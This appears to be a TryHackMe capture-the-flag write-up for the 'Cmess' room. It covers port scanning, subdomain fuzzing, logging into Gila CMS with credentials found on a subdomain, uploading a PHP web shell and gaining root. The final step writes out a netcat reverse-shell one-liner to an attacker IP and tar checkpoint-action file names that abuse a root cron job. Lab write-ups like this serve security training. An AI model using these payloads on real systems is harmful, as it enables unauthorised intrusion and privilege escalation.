# TryHackMe-Cmess

First of all add the IP that is given to in the `/etc/hosts` with the domain cmess.thm

<img src="https://imgur.com/Z9KwSFr.png"/>


## NMAP

```
Nmap scan report for cmess.thm (10.10.212.255)
Host is up (0.42s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.41 seconds

```

We have port 80 and 22 open so let's see whats on the web page


## PORT 80

<img src="https://imgur.com/L0gaVXD.png"/>

It is a CMS and it's a simple page nothing's on it.Nmap scan showed us that there are 3 entries in `robots.txt` so lets see what we can find

<img src="https://imgur.com/VURG6Bg.png"/>

So there are three entries there

<img src="https://imgur.com/e1XMeny.png"/>

But we don't have permissions to access that page, so the only option we have right now is to fuzz for directories

<img src="https://imgur.com/Uf6RYwl.png"/>

Running `gobuster` didn't help us a much we get only a login page which was useful but as we don't have the creds for now we can't do anything with it. Looking at the hint given in the room it says "Have you tried fuzzing subdomains ?".So I decided to go for `wfuzz` which is really an awesome tool if you want to fuzz for parameters and subdomains.

So before using tools and fuzz for subdomain what does a subdomain look like ?.

A subdomain is a part of a domain that you own for example in this case we have domain `http://cmess.thm` now it's subdomain would look like `http://blog.cmess.thm` or `http://support.cmess.thm` so this will be our pattern for subdomain. Now let's start fuzzing for subdomain


<img src="https://imgur.com/zhD02VL.png"/>

Here I am using `seclists` which has a collection of worldists.It's giving us a bunch of subdomain with same lenght of `107l` we don't want that so let's remove it with `--hl 107` which means hiding lenght with 107 , we can also this thing with characters,words and status codes so it's really handy to know it


<img src="https://imgur.com/hYfOtT7.png"/>
Now running it with filters we found a subdomain perfect.

<img src="https://imgur.com/ALlyyjS.png"/>

Visting that we will find a conversation with a user and support team which will give us a password to login to that page we found on `Gila CMS`.

<img src="https://imgur.com/YFB4fxc.png"/>

With that username and password we are logged in also it tells us about the version which it's using `CMS version 1.10.9`.

After we have logged in go to `Content` > `File Manager`

<img src="https://imgur.com/nih8WBa.png"/>

And upload you php shell 

<img src="https://imgur.com/Y4NAyUK.png"/>

<img src="https://imgur.com/Nn8y4WJ.png"/>

Access that file with the domain name

<img src="https://imgur.com/d7qUTsB.png"/>

We will see a cronjob running on the system

<img src="https://imgur.com/7Jn0kzh.png"/>

This is creating an archive of the `backup` folder which is in `andre`'s directory. So we can't really do unless we are in `andre`'s directory so let's run linpeas to find anything juicy to do that first transfer `linpeas` to target box via netcat or python http server


<img src="https://imgur.com/gZ3GnBf.png"/>

On running linpeas I found a password file

<img src="https://imgur.com/5ZyuTv3.png"/>

<img src="https://imgur.com/R5xN0U7.png"/>

After logging and having a user flag navigate to `/home/andre/backup` and these commands and then wait for a minute for a cronjob to trigger
```
echo "mkfifo /tmp/lhennp; nc 10.2.54.209 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
<img src="https://imgur.com/o1L6Bzw.png"/>


And we are root !!!